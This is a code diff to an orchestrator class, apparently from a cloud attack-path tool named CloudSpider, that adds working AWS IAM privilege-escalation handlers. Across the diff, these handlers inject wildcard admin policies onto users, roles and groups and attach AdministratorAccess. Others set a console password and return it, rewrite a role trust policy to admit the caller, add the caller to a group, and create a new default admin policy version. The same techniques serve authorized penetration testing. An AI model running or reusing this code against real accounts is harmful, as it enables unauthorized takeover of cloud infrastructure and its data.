@@ -313,45 +313,220 @@ class Orchestrator:
                     },
                 }
 
-            elif edge_type == "AdministerResource":
-                # Determine action based on target type
-                if ":user/" in target_arn:
-                    iam = session.client("iam")
-                    username = target_arn.split("/")[-1]
-                    iam.put_user_policy(
-                        UserName=username,
-                        PolicyName="CloudSpider-Escalation-Test",
-                        PolicyDocument=json.dumps({
-                            "Version": "2012-10-17",
-                            "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
-                        }),
-                    )
-                    return {
-                        "success": True,
-                        "action": "iam:PutUserPolicy",
-                        "result": {"message": f"Admin policy attached to user {username}."},
-                    }
-                elif ":role/" in target_arn:
-                    iam = session.client("iam")
-                    role_name = target_arn.split("/")[-1]
-                    iam.update_assume_role_policy(
-                        RoleName=role_name,
-                        PolicyDocument=json.dumps({
-                            "Version": "2012-10-17",
-                            "Statement": [{
-                                "Effect": "Allow",
-                                "Principal": {"AWS": "*"},
-                                "Action": "sts:AssumeRole",
-                            }]
-                        }),
-                    )
-                    return {
-                        "success": True,
-                        "action": "iam:UpdateAssumeRolePolicy",
-                        "result": {"message": f"Trust policy updated for role {role_name}."},
-                    }
-                else:
-                    return {"success": False, "error": f"Cannot determine admin action for target: {target_arn}"}
+            elif edge_type == "PutUserPolicy":
+                iam = session.client("iam")
+                username = target_arn.split("/")[-1]
+                iam.put_user_policy(
+                    UserName=username,
+                    PolicyName="CloudSpider-Escalation",
+                    PolicyDocument=json.dumps({
+                        "Version": "2012-10-17",
+                        "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
+                    }),
+                )
+                return {
+                    "success": True, "compromises_target": False,
+                    "action": "iam:PutUserPolicy",
+                    "result": {"message": f"Injected admin inline policy onto user '{username}'. "
+                                          f"The user's effective permissions are now escalated."},
+                }
+
+            elif edge_type == "AttachUserPolicy":
+                iam = session.client("iam")
+                username = target_arn.split("/")[-1]
+                iam.attach_user_policy(
+                    UserName=username,
+                    PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess",
+                )
+                return {
+                    "success": True, "compromises_target": False,
+                    "action": "iam:AttachUserPolicy",
+                    "result": {"message": f"Attached AdministratorAccess to user '{username}'."},
+                }
+
+            elif edge_type == "CreateLoginProfile":
+                iam = session.client("iam")
+                username = target_arn.split("/")[-1]
+                generated_pw = "CloudSpider-Tmp!" + os.urandom(4).hex()
+                try:
+                    iam.create_login_profile(UserName=username, Password=generated_pw, PasswordResetRequired=False)
+                except iam.exceptions.EntityAlreadyExistsException:
+                    iam.update_login_profile(UserName=username, Password=generated_pw, PasswordResetRequired=False)
+                return {
+                    "success": True, "compromises_target": True,
+                    "action": "iam:CreateLoginProfile",
+                    "result": {"message": f"Console password set for user '{username}'.",
+                               "username": username, "password": generated_pw},
+                }
+
+            elif edge_type == "PutRolePolicy":
+                iam = session.client("iam")
+                role_name = target_arn.split("/")[-1]
+                iam.put_role_policy(
+                    RoleName=role_name,
+                    PolicyName="CloudSpider-Escalation",
+                    PolicyDocument=json.dumps({
+                        "Version": "2012-10-17",
+                        "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
+                    }),
+                )
+                return {
+                    "success": True, "compromises_target": False,
+                    "action": "iam:PutRolePolicy",
+                    "result": {"message": f"Injected admin inline policy onto role '{role_name}'. "
+                                          f"Assume the role to use the escalated permissions."},
+                }
+
+            elif edge_type == "AttachRolePolicy":
+                iam = session.client("iam")
+                role_name = target_arn.split("/")[-1]
+                iam.attach_role_policy(
+                    RoleName=role_name,
+                    PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess",
+                )
+                return {
+                    "success": True, "compromises_target": False,
+                    "action": "iam:AttachRolePolicy",
+                    "result": {"message": f"Attached AdministratorAccess to role '{role_name}'. "
+                                          f"Assume the role to use the escalated permissions."},
+                }
+
+            elif edge_type == "UpdateAssumeRolePolicy":
+                iam = session.client("iam")
+                role_name = target_arn.split("/")[-1]
+                # Get the caller's ARN to insert into the trust policy
+                sts = session.client("sts")
+                caller = sts.get_caller_identity()
+                caller_arn = caller["Arn"]
+                account_id = caller["Account"]
+                iam.update_assume_role_policy(
+                    RoleName=role_name,
+                    PolicyDocument=json.dumps({
+                        "Version": "2012-10-17",
+                        "Statement": [{
+                            "Effect": "Allow",
+                            "Principal": {"AWS": [caller_arn, f"arn:aws:iam::{account_id}:root"]},
+                            "Action": "sts:AssumeRole",
+                        }]
+                    }),
+                )
+                return {
+                    "success": True, "compromises_target": False,
+                    "action": "iam:UpdateAssumeRolePolicy",
+                    "result": {"message": f"Trust policy of role '{role_name}' rewritten to allow "
+                                          f"'{caller_arn}'. Use sts:AssumeRole to assume it."},
+                }
+
+            elif edge_type == "PutGroupPolicy":
+                iam = session.client("iam")
+                group_name = target_arn.split("/")[-1]
+                iam.put_group_policy(
+                    GroupName=group_name,
+                    PolicyName="CloudSpider-Escalation",
+                    PolicyDocument=json.dumps({
+                        "Version": "2012-10-17",
+                        "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
+                    }),
+                )
+                return {
+                    "success": True, "compromises_target": False,
+                    "action": "iam:PutGroupPolicy",
+                    "result": {"message": f"Injected admin inline policy onto group '{group_name}'. "
+                                          f"All group members now inherit these permissions."},
+                }
+
+            elif edge_type == "AttachGroupPolicy":
+                iam = session.client("iam")
+                group_name = target_arn.split("/")[-1]
+                iam.attach_group_policy(
+                    GroupName=group_name,
+                    PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess",
+                )
+                return {
+                    "success": True, "compromises_target": False,
+                    "action": "iam:AttachGroupPolicy",
+                    "result": {"message": f"Attached AdministratorAccess to group '{group_name}'."},
+                }
+
+            elif edge_type == "AddUserToGroup":
+                iam = session.client("iam")
+                group_name = target_arn.split("/")[-1]
+                # Add the current caller's user to the group
+                sts = session.client("sts")
+                caller_arn = sts.get_caller_identity()["Arn"]
+                caller_user = caller_arn.split("/")[-1] if ":user/" in caller_arn else None
+                if not caller_user:
+                    return {"success": False, "error": "Current caller is not an IAM user; cannot add to group."}
+                iam.add_user_to_group(GroupName=group_name, UserName=caller_user)
+                return {
+                    "success": True, "compromises_target": False,
+                    "action": "iam:AddUserToGroup",
+                    "result": {"message": f"Added user '{caller_user}' to group '{group_name}'. "
+                                          f"The user now inherits the group's policies."},
+                }
+
+            elif edge_type == "CreatePolicyVersion":
+                # Self-mutation: rewrite a managed policy attached to the caller.
+                # The caller may have CreatePolicyVersion on only ONE specific
+                # policy out of several attached, so we try each candidate.
+                iam = session.client("iam")
+                candidate_arns = []
+                try:
+                    if ":user/" in target_arn:
+                        username = target_arn.split("/")[-1]
+                        attached = iam.list_attached_user_policies(UserName=username)
+                        for p in attached.get("AttachedPolicies", []):
+                            if not p["PolicyArn"].startswith("arn:aws:iam::aws:policy/"):
+                                candidate_arns.append(p["PolicyArn"])
+                    elif ":role/" in target_arn:
+                        role_name = target_arn.split("/")[-1]
+                        attached = iam.list_attached_role_policies(RoleName=role_name)
+                        for p in attached.get("AttachedPolicies", []):
+                            if not p["PolicyArn"].startswith("arn:aws:iam::aws:policy/"):
+                                candidate_arns.append(p["PolicyArn"])
+                except Exception:
+                    pass
+
+                if not candidate_arns:
+                    return {"success": False, "error": "No rewritable customer-managed policy found on this identity."}
+
+                # Try each candidate until one succeeds
+                last_error = None
+                for policy_arn_to_rewrite in candidate_arns:
+                    try:
+                        # Delete oldest non-default version if at the 5-version limit
+                        try:
+                            versions = iam.list_policy_versions(PolicyArn=policy_arn_to_rewrite)["Versions"]
+                            non_default = [v for v in versions if not v["IsDefaultVersion"]]
+                            if len(versions) >= 5 and non_default:
+                                oldest = sorted(non_default, key=lambda v: v["CreateDate"])[0]
+                                iam.delete_policy_version(PolicyArn=policy_arn_to_rewrite, VersionId=oldest["VersionId"])
+                        except Exception:
+                            pass
+
+                        iam.create_policy_version(
+                            PolicyArn=policy_arn_to_rewrite,
+                            PolicyDocument=json.dumps({
+                                "Version": "2012-10-17",
+                                "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
+                            }),
+                            SetAsDefault=True,
+                        )
+                        return {
+                            "success": True, "compromises_target": False,
+                            "action": "iam:CreatePolicyVersion",
+                            "result": {"message": f"Rewrote managed policy '{policy_arn_to_rewrite}' with admin "
+                                                  f"permissions and set as default. The identity's effective "
+                                                  f"permissions are now escalated.",
+                                       "policy_arn": policy_arn_to_rewrite},
+                        }
+                    except Exception as e:
+                        last_error = str(e)
+                        logger.info(f"CreatePolicyVersion on {policy_arn_to_rewrite} denied, trying next...")
+                        continue
+
+                return {"success": False, "error": f"CreatePolicyVersion denied on all {len(candidate_arns)} "
+                                                   f"candidate policies. Last error: {last_error}"}
 
             elif edge_type == "CanUpdateFunction":
                 lam = session.client("lambda")
@@ -501,12 +676,32 @@ class Orchestrator:
 
             elif edge_type == "CanRunInstance":
                 return {
-                    "success": True,
+                    "success": True, "compromises_target": False,
                     "action": "ec2:RunInstances",
                     "result": {
                         "message": f"ec2:RunInstances is authorized for the target. "
                                    f"Actual instance launch requires AMI, subnet, and instance type parameters.",
                         "target": target_arn,
+                    },
+                }
+
+            elif edge_type == "CanInvokeFunction":
+                lam = session.client("lambda")
+                func_name = target_arn.split(":")[-1]
+                logger.info(f"CanInvokeFunction: invoking {func_name}...")
+                invoke_resp = lam.invoke(
+                    FunctionName=func_name,
+                    InvocationType="RequestResponse",
+                    Payload=json.dumps({}),
+                )
+                resp_payload = json.loads(invoke_resp["Payload"].read())
+                return {
+                    "success": True, "compromises_target": False,
+                    "action": "lambda:InvokeFunction",
+                    "result": {
+                        "message": f"Successfully invoked Lambda function '{func_name}'.",
+                        "function_arn": target_arn,
+                        "response": resp_payload,
                     },
                 }
 
